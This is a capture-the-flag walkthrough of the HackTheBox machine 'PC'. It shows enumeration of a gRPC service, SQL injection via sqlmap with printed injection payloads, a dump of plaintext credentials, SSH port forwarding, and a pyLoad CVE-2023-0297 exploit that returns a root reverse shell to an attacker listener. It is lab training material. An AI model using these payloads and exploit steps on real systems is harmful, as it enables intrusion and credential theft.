# PC

[PC](https://app.hackthebox.com/machines/543) is an easy machine on HackTheBox but I found the exploitation of this machine very different from that of other usual easy machines.

Regardless, the goal is to gain root. So, let's begin!

## Enumeration

The first task like always is to run an `nmap` scan against the machine to find all the open ports.

```
$ sudo nmap -sS -p- 10.129.251.25
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 08:11 BST
Nmap scan report for 10.129.251.25
Host is up (0.098s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE
22/tcp    open  ssh
50051/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 356.59 seconds

$ sudo nmap -sV -p22,50051 -sC -A 10.129.251.25
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-26 08:14 BST
Nmap scan report for 10.129.251.25
Host is up (0.089s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=5/26%Time=64705C5B%P=x86_64-pc-linux-gnu%r(N
SF:ULL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x0
SF:6\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(Generic
SF:Lines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetRe
SF:quest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPO
SF:ptions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSP
SF:Request,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\
SF:0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPC
SF:Check,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVe
SF:rsionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\
SF:xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0
SF:")%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0
SF:\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\
SF:0\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0
SF:\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\
SF:0\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x0
SF:5\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0
SF:\?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?
SF:\xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x0
SF:8\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\x
SF:ff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\
SF:0\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   98.64 ms 10.10.14.1
2   97.89 ms 10.129.251.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.72 seconds
```

From the nmap scan result, it can be seen that there are only 2 ports open which are port 22 and 50051. We can quickly do a google search to check if there are any exploitable vulnerabilities for OpenSSH 8.2p1 but we won't find anything useful.
The next and only option that we have is port 50051 but nmap marked it as `unknown`, so we need to figure it out manually.
We can try to #tools/enum/curl it and see if we get some response

```
$ curl 10.129.251.25:50051
curl: (1) Received HTTP/0.9 when not allowed
```

Well this looks like an interesting output. It is possible that there is an old HTTP service running on this port which `curl` is not able to process. But if we do some research then we can find out that this result can be generated for various reasons including that the service running on that port is just not compatible with the request that `curl` sends.
The next thing we can do is try to connect to port via #tools/utility/nc and see if get a response over there:

```
$ nc 10.129.251.25 50051
?��?��
```

Again, we get some weirdly encoded data which makes no sense.

Though this is a high order port we can still check if this is used by some specific service on google.

The usual websites like [Port 50051 (tcp/udp) :: SpeedGuide](https://www.speedguide.net/port.php?port=50051) don't have any information about this but we can see a couple of [Stack Overflow](https://stackoverflow.com/questions/55990378/i-tried-to-deploy-grpc-go-server-in-docker-and-expose-port-in-local-port-but-p) posts that talk about a server called as gRPC. So, we can get started with looking at that.

With just a simple google search we can find the [official documentation](https://grpc.io/docs/what-is-grpc/introduction/) for gRPC which tells us that it is a high performance, open-source universal RPC framework. It is a remote procedure call (RPC) framework that can run anywhere. It enables client and server applications to communicate transparently, and makes it easier to build connected systems.

The next task in front of us is to figure out how to interact with this service. Again, if we just do a quick google search we can find this [medium](https://medium.com/@EdgePress/how-to-interact-with-and-debug-a-grpc-server-c4bc30ddeb0b) article which talks about various tools that can be used to interact with gRPC services. [grpcurl](https://github.com/fullstorydev/grpcurl) is one of them, which we can try to use.

Once, we clone the repo, we can simply follow the instructions given in the README to install it. (I prefer the `make install` method)

<em>Make sure you have GoLang installed and have the variables `$GOPATH` configured and also that `$GOPATH/bin` is added to `$PATH`. You can add the following two lines to your `~/.bashrc` file.</em>

```
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin
```
Now, that we have the tool set up, we can try to interact with the service and see if we get any response.

```
$ grpcurl 10.129.251.25:50051 list
Failed to dial target host "10.129.251.25:50051": tls: first record does not look like a TLS handshake
```

It looks like this error is generated because of some TLS issue, so might need to try a method without TLS. We can try to use the `-plaintext` flag to see if we get any response as it downgrades to plain text HTTP/2 (no TLS).

```
$ grpcurl -plaintext 10.129.251.25:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

We get a response! It looks like there are two services running on this port. We can try to interact with the `SimpleApp` service and see if we can enumerate the methods on this service.

```
$ grpcurl -plaintext 10.129.251.25:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

We get a couple of methods that we can try to interact with. To get started, we can try to use the `RegisterUser` method and see if we get any response. But for that we need to determine the request format that the service expects.

<em>I was not able to determine the request format for this service. So, I moved on and started looking for other methods to interact with the service and that's when I found [grpcui](https://github.com/fullstorydev/grpcui).</em>

This tool is a web-based gRPC client that we can use to interact with the service. We can clone the repo and follow the instructions given in the README to install it. (I prefer the `make install` method)

Once, we have the tool installed, we can start the server and see if we can interact with the service.

```
$ grpcui -plaintext 10.129.251.25:50051
gRPC Web UI available at http://127.0.0.1:41859/
```

And this will lead us to a web interface where we can interact with the service.

![webui](./.images/webui.png)

As it can be seen that the same methods are available here as well. We can try to interact with the `RegisterUser` method and see if we get any response.

![register](./.images/register.png)

As we send this request, we get a response saying that the accound has been created for this user.

![register_response](./.images/register_response.png)

We can use the same credentials now and try to login to the service with the `LoginUser` method.

![login_response](./.images/register_response.png)

It does work and we get 2 things in the response:

1. Our ID in the response data
2. A Token in the response trailer

Now, we can test the last method `getInfo` and see if we get any response.

![getinfo](./.images/getinfo.png)

So, here all that we need to do is just enter the `id` that we want to look up. We can try the `id` value that we got by logging in and see if we get any response.

![getinfo_response](./.images/get_info_response.png)

Looks like this did not work as we had not provided the token in the request. So, we can try to add the token that we received while logging in in the request metadata and see if we get any successful response.

![getinfo2](./.images/getinfo2.png)

And this time the request goes through successfully and we get a response with a message in it.

![getinfo2_response](./.images/getinfo2_response.png)

So, now if we look at the service we can say that there are 3 methods that we can interact with:

1. RegisterUser: We can test this method to determine if a user already exists or not.
2. LoginUser: We can test some default creds or even try to brute force the creds to get a valid user.
3. getInfo: We can try to get information of other users by using the token that we get while logging in.

Also, we can test all these input fields for #attacks/sqli .

So, let's get started with the enumeration of these methods.

We can try to log on to the service with some default creds and see if we get any response. We can use the `admin:admin` creds and see if we get any response.

![login_admin](./.images/login_admin.png)

And that worked! We get a response with the same 2 things that we got while logging in with the other user. So, we can try to use this token and see if we can get any information about the `id` for `admin` account as well as the `id` for the `test` account that we created earlier.

In both the cases, we get the same message saying "Will update soon".

## Initial Foothold

Because, we have a getInfo page where the `id` of the user gets printed, we can try to check it for SQLi with `sqlmap`.

But for that we need to get the request that is being sent to the server. We can use the `burp` proxy to intercept the request and then send it to `sqlmap` for further analysis.

![burp](./.images/burp.png)

<em>Make sure that you get a successful response in Burp. If you get an error in the response then login again and use the new token and id value to perform the `getInfo` action and capture it in Burp. If you continue with the errored response, `sqlmap` might not be able to detect injection properly.</em>

Now that we have a successful response in Burp, we can save its request (use `copy to file` option) and then use it with `sqlmap` to check for SQLi.

```
$ sqlmap -r req --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.12#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:57:17 /2023-05-27/

[10:57:17] [INFO] parsing HTTP request from 'req'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
Cookie parameter '_grpcui_csrf_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[10:57:17] [INFO] testing connection to the target URL
...
...
...
qlmap identified the following injection point(s) with a total of 193 HTTP(s) requests:
---
Parameter: JSON id ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUxOTEzNjZ9.X-kzWhxfQBtZdgAVHb5Zy-lgeaVULAq1DT_z8uX1Lmc"}],"data":[{"id":"421 AND 5219=5219"}]}

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUxOTEzNjZ9.X-kzWhxfQBtZdgAVHb5Zy-lgeaVULAq1DT_z8uX1Lmc"}],"data":[{"id":"421 AND 7923=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))"}]}

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: {"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUxOTEzNjZ9.X-kzWhxfQBtZdgAVHb5Zy-lgeaVULAq1DT_z8uX1Lmc"}],"data":[{"id":"-2775 UNION ALL SELECT CHAR(113,113,113,98,113)||CHAR(99,87,97,68,117,77,113,76,120,71,104,84,83,81,118,98,112,120,82,68,75,121,90,82,113,111,113,107,98,69,110,98,67,119,106,83,82,77,106,82)||CHAR(113,113,98,112,113)-- GZLR"}]}
---
[10:57:34] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite

[*] ending @ 10:57:34 /2023-05-27/
```

So, here we can see that `sqlmap` has detected that there is a SQLite database in the back-end. We can further enumerate this database to get more information.

```
$ sqlmap -r req --batch --dbms sqlite --tables
[11:05:56] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[2 tables]
+----------+
| accounts |
| messages |
+----------+

[*] ending @ 11:05:56 /2023-05-27/
```

We have 2 tables here and obviously the more interesting one is `accounts` but let's dump both the table.

```
$ sqlmap -r req --batch --dbms sqlite -t accounts --dump

Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+

[11:08:04] [INFO] fetching columns for table 'messages' 
[11:08:04] [INFO] fetching entries for table 'messages'
Database: <current>
Table: messages
[1 entry]
+----+----------------------------------------------+----------+
| id | message                                      | username |
+----+----------------------------------------------+----------+
| 1  | The admin is working hard to fix the issues. | admin    |
+----+----------------------------------------------+----------+


[*] ending @ 11:08:04 /2023-05-27/
```

And there we get the credentials for another user `sau`.

Along with these credentials and knowing that the SSH port is open, we can try to login to the machine using these credentials.

```
$ ssh sau@10.129.251.25
The authenticity of host '10.129.251.25 (10.129.251.25)' can't be established.
ECDSA key fingerprint is SHA256:1g85rB6ht6M95bNqeghJZT5nAhCfSdKOoWWx7TE+5Ck.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.251.25' (ECDSA) to the list of known hosts.
sau@10.129.251.25's password: 
Last login: Mon May 15 09:00:44 2023 from 10.10.14.19
sau@pc:~$ whoami
sau
sau@pc:~$ uname -a
Linux pc 5.4.0-148-generic #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

Now, we can get the user flag.

## Privilege Escalation

Now that we have a shell on the machine, we can start looking for privilege escalation vectors. We can start by looking for SUID binaries.

```
$ find / -perm /2000 2> /dev/null 
/var/log/journal
/var/log/journal/52ecde973e1e49a1b8fbee7dab5410c1
/var/local
/var/mail
/snap/core20/1778/usr/bin/chage
/snap/core20/1778/usr/bin/expiry
/snap/core20/1778/usr/bin/ssh-agent
/snap/core20/1778/usr/bin/wall
/snap/core20/1778/usr/sbin/pam_extrausers_chkpwd
/snap/core20/1778/usr/sbin/unix_chkpwd
/snap/core20/1778/var/mail
/run/log/journal
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/bin/crontab
/usr/bin/at
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/ssh-agent
/usr/bin/expiry
/usr/bin/wall
/usr/local/lib/python3.8
```

The list is pretty exhaustive but none of them seem to be exploitable. So, we can move on and check the commands that the user can run as root.

```
sau@pc:~$ sudo -l
[sudo] password for sau: 
Sorry, user sau may not run sudo on localhost.
```

And it seems that the user can't run any commands as root. So, we can move on and check if there are any cron jobs running on the machine.

```
sau@pc:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

We can't find anything interesting over here as well. So, the next thing that we could check would be the ports that the machine is listening on.

```
sau@pc:~$ netstat -auntp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
tcp        0    256 10.129.251.25:22        10.10.14.5:39388        ESTABLISHED -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::50051                :::*                    LISTEN      -                   
tcp6       0      0 10.129.251.25:50051     10.10.14.5:55318        ESTABLISHED -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
```

And interestingly, we can see that the machine is listening on port 8000. So, we can try to access it from our browser by port forwarding the port to our machine.

```
$ ssh -L 1234:localhost:8000 sau@10.129.251.25
sau@10.129.251.25's password: 
Last login: Sat May 27 10:11:40 2023 from 10.10.14.5
sau@pc:~$ 
```

Here, we are basically forwarding the port 8000 on the remote machine to port 1234 on our machine. Now, we can access the port on our machine by visiting `localhost:1234` on our browser.

![portfwd_pyload](./.images/portfwd_pyload.png)

We can see that there is a pyLoad login page running on this port. We can try to login with the credentials that we found earlier but they don't work. So, now that we know there is a service called as pyLoad running on the machine, we can try to find exploits for it.

With a quick google search, we can find a [Pre-auth RCE](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/) for pyLoad and we can also find a Python Script for the same on [GitHub](https://github.com/JacobEbben/CVE-2023-0297.git). Exploiting this appears to be pretty simple. We just need to send a POST request to the host with the following payload and this can also be done with the help of the python script.

Make sure before running the python script you start a listener on your machine.

```
$ python3 exploit.py 
usage: exploit.py [-h] -t TARGET [-c COMMAND] [-I ATK_IP] [-P ATK_PORT] [-x PROXY]
exploit.py: error: the following arguments are required: -t/--target\
$ python3 exploit.py -t localhost:1234 -I 10.10.14.5 -P 9001
[SUCCESS] Running reverse shell. Check your listener!
```

And with that we get our reverse shell as root.

```
$ nc -nlvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.129.251.25.
Ncat: Connection from 10.129.251.25:59232.
bash: cannot set terminal process group (1036): Inappropriate ioctl for device
bash: no job control in this shell
root@pc:~/.pyload/data# whoami
whoami
root
root@pc:~/.pyload/data# uname -a
uname -a
Linux pc 5.4.0-148-generic #165-Ubuntu SMP Tue Apr 18 08:53:12 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

And with that we can get the root flag.

## Key Points to Take Away

1. If you encounter an unknown service, try `nc` or `curl` to connect to it.
2. Look for services that are usually used by the port in question.
3. Try different tools to connect with unknown services.

## References

1. [PC](https://app.hackthebox.com/machines/543)
2. [gRPC Official Documentation](https://grpc.io/docs/what-is-grpc/introduction/)
3. [Tools to Interact With gRPC](https://medium.com/@EdgePress/how-to-interact-with-and-debug-a-grpc-server-c4bc30ddeb0b)
4. [grpcurl](https://github.com/fullstorydev/grpcurl)
5. [grpcui](https://github.com/fullstorydev/grpcui)
6. [PyLoad Pre-auth RCE](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)
7. [CVE-2023-0297 - GitHub](https://github.com/JacobEbben/CVE-2023-0297.git)